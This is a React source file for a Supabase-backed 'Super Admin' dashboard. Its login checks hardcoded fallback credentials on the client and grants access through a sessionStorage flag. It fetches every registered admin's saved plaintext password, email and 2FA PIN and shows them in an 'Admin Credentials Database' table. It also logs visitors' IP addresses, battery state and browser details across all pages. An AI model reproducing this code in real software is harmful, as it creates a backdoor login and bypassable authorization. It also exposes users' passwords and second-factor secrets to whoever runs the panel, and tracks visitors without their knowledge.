import React, { useEffect, useState } from 'react';
import { supabase } from '../lib/supabase';
import { Activity, Users, Shield, Clock, Monitor, Globe, Network, Terminal, Smartphone, Calendar, Key, AlertTriangle, Filter, MessageSquare, X } from 'lucide-react';

export default function SuperAdminDashboard() {
  const [loading, setLoading] = useState(true);
  const [globalStats, setGlobalStats] = useState<any[]>([]);
  const [admins, setAdmins] = useState<any[]>([]);
  const [timeFilter, setTimeFilter] = useState<'1h' | '2h' | '2d' | '1w' | '30d' | '60d' | 'all' | 'custom'>('all');
  const [customHours, setCustomHours] = useState('24');
  
  const [isAuthorized, setIsAuthorized] = useState(sessionStorage.getItem('super_admin_auth') === 'true');
  const [authUsername, setAuthUsername] = useState('');
  const [authPassword, setAuthPassword] = useState('');
  const [authError, setAuthError] = useState('');
  
  const [settingsUsername, setSettingsUsername] = useState('');
  const [settingsPassword, setSettingsPassword] = useState('');
  const [settingsMsg, setSettingsMsg] = useState('');
  
  // Message Modal State
  const [showMessageModal, setShowMessageModal] = useState(false);
  const [selectedAdminId, setSelectedAdminId] = useState<string | null>(null);
  const [selectedAdminUsername, setSelectedAdminUsername] = useState<string>('');
  const [adminMessage, setAdminMessage] = useState('');
  const [messageSending, setMessageSending] = useState(false);

  useEffect(() => {
    if (isAuthorized) {
      fetchData();

      // Implement real-time tracking so we don't have to refresh
      const channel = supabase.channel('super-admin-realtime')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'global_analytics' }, (payload) => {
          setGlobalStats(prev => [payload.new, ...prev]);
        })
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'profiles' }, (payload) => {
          setAdmins(prev => [payload.new, ...prev]);
        })
        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'profiles' }, (payload) => {
          setAdmins(prev => prev.map(admin => admin.id === payload.new.id ? payload.new : admin));
        })
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      }
    }
  }, [timeFilter, customHours, isAuthorized]);
  
  const handleLogin = async (e: any) => {
    e.preventDefault();
    try {
      const { data } = await supabase.from('super_admin_auth').select('*').eq('id', 1).single();
      const validUser = data?.username || 'saqib';
      const validPass = data?.password || 'saqibadmin';
      
      if (authUsername === validUser && authPassword === validPass) {
        sessionStorage.setItem('super_admin_auth', 'true');
        setIsAuthorized(true);
      } else {
        setAuthError('Invalid credentials');
      }
    } catch(err) {
      if (authUsername === 'saqib' && authPassword === 'saqibadmin') {
        sessionStorage.setItem('super_admin_auth', 'true');
        setIsAuthorized(true);
      } else {
        setAuthError('Invalid credentials');
      }
    }
  };

  const handleUpdateAuth = async (e: any) => {
    e.preventDefault();
    try {
      const { error } = await supabase.from('super_admin_auth').update({
        username: settingsUsername || 'saqib',
        password: settingsPassword || 'saqibadmin'
      }).eq('id', 1);
      if (error) throw error;
      setSettingsMsg('Credentials updated successfully!');
    } catch (err: any) {
      setSettingsMsg(err.message || 'Error updating credentials. Run SQL below first.');
    }
  };

  const handleSendMessage = async () => {
    if (!adminMessage.trim() || !selectedAdminId) return;
    setMessageSending(true);
    try {
        await supabase.from('super_admin_messages').insert({
            admin_id: selectedAdminId,
            message: adminMessage
        });
        setShowMessageModal(false);
        setAdminMessage('');
        alert('Message sent successfully!');
    } catch(err) {
        alert('Failed to send. Please make sure SQL query is executed.');
    } finally {
        setMessageSending(false);
    }
  };

  const fetchData = async () => {
    setLoading(true);
    try {
      // 1. Fetch ALL Admins with their saved passwords and PINs
      const { data: adminsData, error: adminsError } = await supabase
        .from('profiles')
        .select('*')
        .order('created_at', { ascending: false });
        
      if (!adminsError && adminsData) {
        setAdmins(adminsData);
      }
      
      // 2. Fetch Global Analytics based on time filter
      let query = supabase
        .from('global_analytics')
        .select('*')
        .order('created_at', { ascending: false });
        
      if (timeFilter !== 'all') {
        let hoursToSubtract = 0;
        if (timeFilter === '1h') hoursToSubtract = 1;
        else if (timeFilter === '2h') hoursToSubtract = 2;
        else if (timeFilter === '2d') hoursToSubtract = 48;
        else if (timeFilter === '1w') hoursToSubtract = 168; // 7 days
        else if (timeFilter === '30d') hoursToSubtract = 720; // 30 days
        else if (timeFilter === '60d') hoursToSubtract = 1440; // 60 days
        else if (timeFilter === 'custom') hoursToSubtract = parseInt(customHours) || 24;
        
        const pastDate = new Date();
        pastDate.setHours(pastDate.getHours() - hoursToSubtract);
        query = query.gte('created_at', pastDate.toISOString());
      }
      
      const { data: analyticsData, error: analyticsError } = await query;
      
      if (!analyticsError && analyticsData) {
        setGlobalStats(analyticsData);
      }
      
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };
  
  // Calculate unique IPs, Top Browser, and Top OS
  const uniqueIps = Array.from(new Set(globalStats.map(s => s.metadata?.ip_address).filter(Boolean)));
  
  const getMostFrequent = (arr: string[]) => {
    if (arr.length === 0) return "N/A";
    const counts = arr.reduce((acc, val) => { acc[val] = (acc[val] || 0) + 1; return acc; }, {} as Record<string, number>);
    return Object.keys(counts).reduce((a, b) => counts[a] > counts[b] ? a : b);
  };
  
  const topBrowser = getMostFrequent(globalStats.map(s => {
    const ua = s.metadata?.browser_info?.toLowerCase() || '';
    if (ua.includes('chrome')) return 'Chrome';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('edge')) return 'Edge';
    return "Other";
  }));

  const topOS = getMostFrequent(globalStats.map(s => {
    const plat = s.metadata?.platform?.toLowerCase() || '';
    if (plat.includes('win')) return 'Windows';
    if (plat.includes('mac')) return 'macOS';
    if (plat.includes('linux')) return 'Linux';
    if (plat.includes('android')) return 'Android';
    if (plat.includes('iphone') || plat.includes('ipad')) return 'iOS';
    return "Other OS";
  }));

  if (!isAuthorized) {
    return (
      <div className="min-h-screen bg-[#030014] text-white p-4 flex items-center justify-center font-mono">
        <form onSubmit={handleLogin} className="bg-[#0A0F1E] border border-rose-500/20 p-8 rounded-2xl w-full max-w-md shadow-[0_0_50px_rgba(244,63,94,0.1)]">
           <div className="flex justify-center mb-6">
             <Shield className="w-12 h-12 text-rose-500" />
           </div>
           <h2 className="text-center text-rose-500 font-black tracking-widest text-xl mb-6 flex flex-col items-center">
             <span>SUPER ADMIN LOGIN</span>
             <span className="text-[10px] text-zinc-500 mt-2 font-normal">Level 10 Clearance Required</span>
           </h2>
           {authError && <div className="bg-red-500/10 border border-red-500/20 text-red-500 p-3 rounded mb-4 text-center text-sm">{authError}</div>}
           <div className="space-y-4">
             <div>
               <label className="text-xs text-zinc-500 uppercase font-bold tracking-widest mb-1 block">Username</label>
               <input type="text" value={authUsername} onChange={e => setAuthUsername(e.target.value)} className="w-full bg-black/50 border border-white/10 rounded-lg px-4 py-3 text-white outline-none focus:border-rose-500 transition-colors" required />
             </div>
             <div>
               <label className="text-xs text-zinc-500 uppercase font-bold tracking-widest mb-1 block">Password</label>
               <input type="password" value={authPassword} onChange={e => setAuthPassword(e.target.value)} className="w-full bg-black/50 border border-white/10 rounded-lg px-4 py-3 text-white outline-none focus:border-rose-500 transition-colors" required />
             </div>
           </div>
           <button type="submit" className="w-full mt-6 bg-rose-600 hover:bg-rose-500 text-white font-bold tracking-widest uppercase py-4 rounded-lg shadow-[0_0_20px_rgba(225,29,72,0.4)] transition-all">AUTHENTICATE</button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#030014] text-white p-4 md:p-8 font-mono">
      <div className="max-w-7xl mx-auto space-y-8">
        
        <div className="flex flex-col md:flex-row items-center justify-between border-b gap-4 border-white/10 pb-6">
          <div>
            <h1 className="text-2xl md:text-3xl font-black text-rose-500 flex items-center gap-3">
              <Shield className="w-8 h-8" />
              GLOBAL SYSTEM OVERVIEW
            </h1>
            <p className="text-zinc-500 mt-2 flex items-center gap-2">
              <AlertTriangle className="w-4 h-4 text-amber-500" />
              Super Admin Auth Verified. Tracking all pages (login, admin, public).
            </p>
          </div>
          
          <div className="flex items-center gap-4">
            <button
              onClick={() => {
                sessionStorage.removeItem('super_admin_auth');
                setIsAuthorized(false);
              }}
              className="px-4 py-2 border border-rose-500/20 text-rose-400 hover:bg-rose-500/10 rounded-xl text-sm font-bold transition-colors"
            >
              Sign Out
            </button>
            <div className="flex items-center gap-3 bg-black/40 p-2 rounded-xl border border-white/5">
            <Filter className="w-4 h-4 text-zinc-500" />
            <select 
              value={timeFilter}
              onChange={(e: any) => setTimeFilter(e.target.value)}
              className="bg-transparent text-sm text-rose-400 font-bold outline-none cursor-pointer"
            >
              <option value="1h">Last 1 Hour</option>
              <option value="2h">Last 2 Hours</option>
              <option value="2d">Last 2 Days</option>
              <option value="1w">Last 7 Days</option>
              <option value="30d">Last 30 Days</option>
              <option value="60d">Last 60 Days</option>
              <option value="all">All Time</option>
              <option value="custom">Custom Hours</option>
            </select>
            {timeFilter === 'custom' && (
              <input 
                type="number" 
                value={customHours}
                onChange={(e) => setCustomHours(e.target.value)}
                className="w-16 bg-white/5 border border-white/10 rounded px-2 py-1 text-xs"
                placeholder="Hrs"
              />
            )}
            </div>
          </div>
        </div>

        {/* Global Key Metrics */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          <div className="bg-[#0A0F1E] border border-rose-500/20 rounded-2xl p-6 shadow-[0_0_20px_rgba(244,63,94,0.1)]">
            <h3 className="text-zinc-500 text-xs font-bold uppercase tracking-widest mb-4 flex items-center gap-2">
              <Network className="w-4 h-4 text-rose-400" /> Total Site Clicks
            </h3>
            <div className="text-4xl font-black text-white">
              {loading ? <Activity className="animate-spin w-8 h-8 text-rose-500" /> : globalStats.length}
            </div>
            <div className="text-xs text-rose-400 mt-2">All pages combined</div>
          </div>
          
          <div className="bg-[#0A0F1E] border border-cyan-500/20 rounded-2xl p-6 shadow-[0_0_20px_rgba(6,182,212,0.1)]">
            <h3 className="text-zinc-500 text-xs font-bold uppercase tracking-widest mb-4 flex items-center gap-2">
              <Globe className="w-4 h-4 text-cyan-400" /> Unique IPs
            </h3>
            <div className="text-4xl font-black text-white">
              {loading ? <Activity className="animate-spin w-8 h-8 text-cyan-500" /> : uniqueIps.length}
            </div>
            <div className="text-xs text-cyan-400 mt-2">Distinct devices</div>
          </div>

          <div className="bg-[#0A0F1E] border border-emerald-500/20 rounded-2xl p-6 shadow-[0_0_20px_rgba(16,185,129,0.1)]">
            <h3 className="text-zinc-500 text-xs font-bold uppercase tracking-widest mb-4 flex items-center gap-2">
              <Users className="w-4 h-4 text-emerald-400" /> Registered Admins
            </h3>
            <div className="text-4xl font-black text-white">
              {loading ? <Activity className="animate-spin w-8 h-8 text-emerald-500" /> : admins.length}
            </div>
            <div className="text-xs text-emerald-400 mt-2">Total accounts created</div>
          </div>
        </div>

        {/* Device & Platform Breakdown (The Amazing Feature) */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
           <div className="bg-[#0A0F1E] border border-amber-500/20 rounded-2xl p-6 shadow-[0_0_20px_rgba(245,158,11,0.05)] flex items-center justify-between">
              <div>
                <h3 className="text-zinc-500 text-xs font-bold uppercase tracking-widest mb-1 flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-amber-400" /> Top Browser Array
                </h3>
                <div className="text-2xl font-black text-amber-400">{loading ? "..." : topBrowser}</div>
              </div>
              <Activity className="w-8 h-8 text-amber-500/20" />
           </div>
           
           <div className="bg-[#0A0F1E] border border-indigo-500/20 rounded-2xl p-6 shadow-[0_0_20px_rgba(99,102,241,0.05)] flex items-center justify-between">
              <div>
                <h3 className="text-zinc-500 text-xs font-bold uppercase tracking-widest mb-1 flex items-center gap-2">
                  <Smartphone className="w-4 h-4 text-indigo-400" /> Predominant OS Built
                </h3>
                <div className="text-2xl font-black text-indigo-400">{loading ? "..." : topOS}</div>
              </div>
              <Monitor className="w-8 h-8 text-indigo-500/20" />
           </div>
        </div>

        {/* Super Admin Settings */}
        <div className="bg-[#0A0F1E] border border-amber-500/20 rounded-2xl p-6 shadow-[0_0_20px_rgba(245,158,11,0.05)]">
          <h2 className="text-amber-400 font-bold uppercase tracking-widest text-sm flex items-center gap-2 mb-4">
            <Key className="w-5 h-5" />
            Update Super Admin Credentials
          </h2>
          <form onSubmit={handleUpdateAuth} className="grid grid-cols-1 md:grid-cols-3 gap-4 border-t border-white/5 pt-4">
            <div>
              <label className="text-xs text-zinc-500 uppercase font-bold tracking-widest mb-1 block">New Username</label>
              <input type="text" placeholder="saqib" value={settingsUsername} onChange={e => setSettingsUsername(e.target.value)} className="w-full bg-black/50 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-amber-500 transition-colors" required />
            </div>
            <div>
              <label className="text-xs text-zinc-500 uppercase font-bold tracking-widest mb-1 block">New Password</label>
              <input type="text" placeholder="saqibadmin" value={settingsPassword} onChange={e => setSettingsPassword(e.target.value)} className="w-full bg-black/50 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-amber-500 transition-colors" required />
            </div>
            <div className="flex items-end">
              <button type="submit" className="w-full bg-amber-600 hover:bg-amber-500 text-white font-bold py-2 rounded-lg transition-all border border-amber-500/20 shadow-[0_0_15px_rgba(245,158,11,0.3)]">Update Security</button>
            </div>
          </form>
          {settingsMsg && <p className="text-amber-500 text-xs mt-3 font-bold">{settingsMsg}</p>}
        </div>

        {/* Registered Admins Intel */}
        <div className="bg-[#0A0F1E] border border-emerald-500/20 rounded-2xl overflow-hidden shadow-[0_0_20px_rgba(16,185,129,0.05)]">
          <div className="p-4 border-b border-white/5 bg-emerald-500/5 flex justify-between items-center">
            <h2 className="text-emerald-400 font-bold uppercase tracking-widest text-sm flex items-center gap-2">
              <Key className="w-5 h-5" />
              Admin Credentials Database
            </h2>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-left whitespace-nowrap min-w-[800px]">
              <thead>
                <tr className="bg-black/30 border-b border-white/5 text-xs text-zinc-500 uppercase">
                  <th className="p-4">UserID (UUID)</th>
                  <th className="p-4">Username</th>
                  <th className="p-4">Email</th>
                  <th className="p-4">Saved Password</th>
                  <th className="p-4">2FA Status</th>
                  <th className="p-4">2FA PIN</th>
                  <th className="p-4">Joined</th>
                  <th className="p-4 text-right">Action</th>
                </tr>
              </thead>
              <tbody>
                {admins.map((admin, idx) => (
                  <tr key={idx} className="border-b border-white/5 hover:bg-white/[0.02]">
                    <td className="p-4 text-zinc-500 font-mono text-xs">{admin.id}</td>
                    <td className="p-4 text-emerald-400 font-bold">@{admin.username}</td>
                    <td className="p-4 text-zinc-300 text-sm">{admin.saved_email || "Unknown"}</td>
                    <td className="p-4 font-mono text-zinc-300">
                      {admin.saved_password ? (
                        <span className="bg-emerald-500/10 text-emerald-400 px-2 py-1 rounded border border-emerald-500/20">{admin.saved_password}</span>
                      ) : (
                        <span className="text-zinc-600">Not recorded</span>
                      )}
                    </td>
                    <td className="p-4">
                      {admin.two_factor_enabled ? (
                        <span className="text-amber-400 bg-amber-500/10 px-2 py-1 rounded text-xs border border-amber-500/20">Enabled</span>
                      ) : (
                        <span className="text-zinc-500">Disabled</span>
                      )}
                    </td>
                    <td className="p-4 font-mono text-zinc-300">
                      {admin.two_factor_pin ? (
                        <span className="bg-amber-500/10 text-amber-400 px-2 py-1 rounded border border-amber-500/20">{admin.two_factor_pin}</span>
                      ) : (
                        <span className="text-zinc-600">None</span>
                      )}
                    </td>
                    <td className="p-4 text-zinc-500 text-sm">
                      {new Date(admin.created_at).toLocaleDateString()}
                    </td>
                    <td className="p-4 text-right">
                      <button 
                        onClick={() => {
                            setSelectedAdminId(admin.id);
                            setSelectedAdminUsername(admin.username);
                            setShowMessageModal(true);
                        }}
                        className="text-xs bg-indigo-500/20 text-indigo-400 hover:bg-indigo-500/40 border border-indigo-500/30 px-3 py-1.5 rounded flex items-center gap-1.5 ml-auto transition-colors"
                      >
                          <MessageSquare className="w-3.5 h-3.5" />
                          Message
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        {/* Global Click Stream */}
        <div className="bg-[#0A0F1E] border border-rose-500/20 rounded-2xl overflow-hidden shadow-[0_0_20px_rgba(244,63,94,0.05)]">
          <div className="p-4 border-b border-white/5 bg-rose-500/5 flex justify-between items-center">
            <h2 className="text-rose-400 font-bold uppercase tracking-widest text-sm flex items-center gap-2">
              <Activity className="w-5 h-5" />
              Live Site Trajectory (All Pages)
            </h2>
          </div>
          <div className="overflow-x-auto max-h-[500px]">
            <table className="w-full text-left whitespace-nowrap min-w-[800px]">
              <thead className="sticky top-0 bg-[#0A0F1E] z-10">
                <tr className="bg-black/30 border-b border-white/5 text-xs text-zinc-500 uppercase">
                  <th className="p-4">Time</th>
                  <th className="p-4">Path Visited</th>
                  <th className="p-4">IP Address</th>
                  <th className="p-4">Battery / Charging</th>
                  <th className="p-4">Network / Browser</th>
                </tr>
              </thead>
              <tbody>
                {globalStats.map((stat, idx) => {
                  const meta = stat.metadata || {};
                  return (
                    <tr key={idx} className="border-b border-white/5 hover:bg-white/[0.02]">
                      <td className="p-4 text-zinc-400 text-xs">
                        {new Date(stat.created_at).toLocaleString()}
                      </td>
                      <td className="p-4">
                        <span className="text-rose-400 font-bold bg-rose-500/10 px-2 py-1 rounded border border-rose-500/20 text-xs">
                          {stat.path}
                        </span>
                      </td>
                      <td className="p-4 text-emerald-400 font-mono text-sm">
                        {meta.ip_address || 'Unknown IP'}
                      </td>
                      <td className="p-4 text-zinc-300 text-xs">
                        <span className="text-cyan-400">{meta.battery_level || 'N/A'}</span> / {' '}
                        <span className="text-amber-400">{meta.is_charging || 'N/A'}</span>
                      </td>
                      <td className="p-4">
                        <div className="max-w-[200px] truncate text-xs text-zinc-500" title={meta.browser_info}>
                          {meta.browser_info || 'N/A'}
                        </div>
                      </td>
                    </tr>
                  )
                })}
                {globalStats.length === 0 && (
                  <tr>
                    <td colSpan={5} className="p-8 text-center text-zinc-500">No global traffic recorded in this timeframe.</td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>

      </div>

      {/* Message Modal */}
      {showMessageModal && (
        <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center p-4 sm:p-6 bg-[#030014]/80 backdrop-blur-md animate-in fade-in duration-200">
          <div className="bg-[#0A0F1E]/90 border border-indigo-500/30 rounded-[2rem] sm:rounded-3xl p-6 sm:p-8 w-full max-w-md shadow-[0_20px_50px_rgba(99,102,241,0.2)] backdrop-blur-xl relative overflow-hidden animate-in slide-in-from-bottom-8 sm:slide-in-from-bottom-0 sm:zoom-in-95 pb-8 sm:pb-8">
            
            <div className="absolute top-0 right-0 w-32 h-32 bg-indigo-500/20 rounded-full blur-[40px] -z-10 pointer-events-none"></div>
            <div className="absolute bottom-0 left-0 w-32 h-32 bg-rose-500/10 rounded-full blur-[40px] -z-10 pointer-events-none"></div>

            <div className="flex justify-between items-center mb-6">
              <h2 className="text-xl font-black text-white flex items-center gap-3 drop-shadow-md">
                <div className="w-10 h-10 rounded-full bg-indigo-500/20 border border-indigo-500/30 flex items-center justify-center">
                   <Shield className="w-5 h-5 text-indigo-400" />
                </div>
                Message Admin
              </h2>
              <button 
                onClick={() => setShowMessageModal(false)}
                className="p-2 rounded-full bg-white/5 text-zinc-400 hover:text-white hover:bg-white/10 transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            
            <div className="mb-6 z-10 relative">
               <p className="text-zinc-400 text-sm mb-3">Sending secure communication to <span className="font-black text-indigo-400 tracking-wide text-base">@{selectedAdminUsername}</span>.</p>
               <textarea 
                  value={adminMessage}
                  onChange={(e) => setAdminMessage(e.target.value)}
                  placeholder="Enter your message here..."
                  className="w-full h-36 bg-black/60 border border-white/10 rounded-2xl p-4 text-white placeholder-zinc-600 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none resize-none transition-all shadow-inner"
               />
            </div>
            
            <div className="flex gap-4 z-10 relative">
               <button 
                  onClick={() => setShowMessageModal(false)}
                  className="flex-1 py-3 rounded-2xl border border-white/10 text-zinc-400 hover:text-white hover:bg-white/5 transition-colors font-bold tracking-wider"
               >
                  Cancel
               </button>
               <button 
                  onClick={handleSendMessage}
                  disabled={messageSending || !adminMessage.trim()}
                  className="flex-1 py-3 rounded-2xl bg-indigo-600/90 hover:bg-indigo-500 text-white font-bold tracking-wider flex justify-center items-center gap-2 disabled:opacity-50 transition-all shadow-[0_0_20px_rgba(99,102,241,0.3)] hover:-translate-y-0.5"
               >
                  {messageSending ? <Activity className="w-4 h-4 animate-spin" /> : <MessageSquare className="w-4 h-4" />}
                  {messageSending ? 'Sending...' : 'Transmit'}
               </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
